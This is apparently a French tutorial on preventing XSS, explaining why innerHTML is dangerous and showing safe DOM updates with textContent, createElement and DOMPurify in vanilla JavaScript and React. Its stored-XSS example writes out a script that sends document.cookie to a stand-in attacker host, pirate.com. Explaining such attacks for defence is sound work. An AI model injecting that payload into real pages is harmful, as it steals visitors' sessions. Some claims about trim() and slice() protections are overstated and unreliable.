1. Qu’est-ce qu’une attaque XSS ? (Cross-Site Scripting)

Une attaque XSS permet à un attaquant d’injecter du code JavaScript malveillant dans une page web légitime.

Ce code s’exécute dans le navigateur de la victime, avec tous ses droits : accès aux cookies, localStorage, caméra, micro, etc.

Conséquences réelles :
• Vol de session (cookie → connexion automatique sur un site pirate)
• Vol de token JWT ou API
• Keylogger (capture des mots de passe)
• Phishing interne
• Défiguration de site (Defacement) Exemple
Exemple d'attaque XSS Stored (stockée)

Un utilisateur malveillant écrit dans un champ commentaire :

<script>fetch('https://pirate.com/steal?cookie='+document.cookie)</script>

Si ce texte est affiché avec innerHTML → le script s’exécute chez tous les visiteurs.

2. Qu’est-ce que des « données non filtrées » ?

Toute donnée qui ne vient pas de ton code est potentiellement dangereuse :

  • input.value, formulaires
  • Paramètres d’URL (?name=..., hash)
  • localStorage / sessionStorage (l’utilisateur peut les modifier)
  • Réponses API (même ton propre back-end si tu ne valides pas)
  • Commentaires, chat, messages WebSocket
Règle d’or de la sécurité web :
« Ne fais jamais confiance aux données entrantes. »

3. Manipulation du DOM : Les 3 méthodes et leur dangerosité

MéthodeInterprète le HTML ?XSS possible ?Recommandation 2025
innerHTML = donnée Oui Extrêmement dangereux À BANNIR avec données utilisateur
textContent ou innerText Non (échappe tout) Sûr Recommandé
createElement() + textContent Non 100 % sûr Meilleure pratique absolue
Méthode ultra-sécurisée (recommandée partout)
const p = document.createElement('p');
p.textContent = donnéeUtilisateur;  // ← XSS impossible

4. Création dynamique de balises HTML (en toute sécurité)

Méthode professionnelle 2025 :
createElement() + textContent + nettoyage strict
Exemple complet sécurisé (vanilla JS)
const input = document.getElementById('prenom');
const btn = document.getElementById('ajouter');
const liste = document.getElementById('liste');

btn.addEventListener('click', () => {
  let valeur = input.value
    .trim()                     // enlève espaces début/fin
    .normalize('NFKC')          // protection attaques Unicode
    .replace(/\s+/g, ' ')       // évite les espaces multiples
    .slice(0, 30);              // limite à 30 caractères (anti-DoS)

  if (!valeur) {
    alert('Veuillez saisir un prénom');
    return;
  }

  const li = document.createElement('li');
  li.textContent = valeur;       // ← Méthode la plus sûre
  liste.appendChild(li);
  input.value = '';
});

5. Pourquoi utiliser trim() et slice() ?

trim() → Sécurité + UX

  • Évite les soumissions d’espaces uniquement (" ")
  • Empêche les attaques avec espaces invisibles (Unicode)

slice(0, max) → Protection contre les attaques massives

  • Empêche un input de 10 Mo (crash navigateur)
  • Limite les attaques de type "billion laughs" côté client
valeur = valeur.trim().slice(0, 50);

6. React : Sécurisé par défaut (mais attention !)

React échappe automatiquement tout ce qui est dans {} → pas de XSS avec cette syntaxe.

100 % sûr
{users.map(u => <li key={u.id}>{u.nom}</li>)}
Les seules exceptions dangereuses :
• dangerouslySetInnerHTML={{ __html: ... }}
• contentEditable avec HTML brut

→ Utilise DOMPurify dans ce cas : 
import DOMPurify from 'dompurify';
const htmlSafe = DOMPurify.sanitize(htmlMalveillant);

7. Exemple complet JavaScript vanilla (100 % sécurisé)

<input type="text" id="nom" placeholder="Ton nom" maxlength="50">
<button id="ajouter">Ajouter</button>
<ul id="liste"></ul>

<script>
  const input = document.getElementById('nom');
  const btn = document.getElementById('ajouter');
  const liste = document.getElementById('liste');

  btn.addEventListener('click', () => {
    let nom = input.value
      .trim()
      .normalize('NFKC')
      .replace(/\s+/g, ' ')
      .slice(0, 30);

    if (!nom) return alert('Nom vide !');

    const li = document.createElement('li');
    li.textContent = nom;
    liste.appendChild(li);
    input.value = '';
  });
</script>

8. Exemple complet React (Next.js / Vite / CRA)

import { useState } from 'react';

export default function ListeNoms() {
  const [noms, setNoms] = useState([]);
  const [nom, setNom] = useState('');

  const ajouter = () => {
    const nettoye = nom.trim().slice(0, 30);
    if (!nettoye) return;

    setNoms([...noms, nettoye]);
    setNom('');
  };

  return (
    <div style={{padding: '20px', fontFamily: 'sans-serif'}}>
      <h2>Ajouter un nom</h2>
      <input
        value={nom}
        onChange={(e) => setNom(e.target.value)}
        placeholder="Entrez un nom"
        maxLength={50}
      />
      <button onClick={ajouter} style={{marginLeft: '10px'}}>Ajouter</button>

      <ul style={{marginTop: '20px'}}>
        {noms.map((n, i) => <li key={i}>{n}</li>)}
      </ul>
    </div>
  );
}
